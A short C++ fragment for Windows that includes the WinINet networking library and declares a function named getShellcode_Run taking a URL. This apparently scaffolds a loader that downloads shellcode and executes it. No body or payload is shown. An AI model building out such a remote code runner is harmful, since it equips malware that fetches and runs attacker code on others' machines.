#include <iostream>
#include <iterator>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet")

#define DEFAULT_BUFLEN 4096

#include "get_buf.h"

using namespace std;

int getShellcode_Run(const char* url);
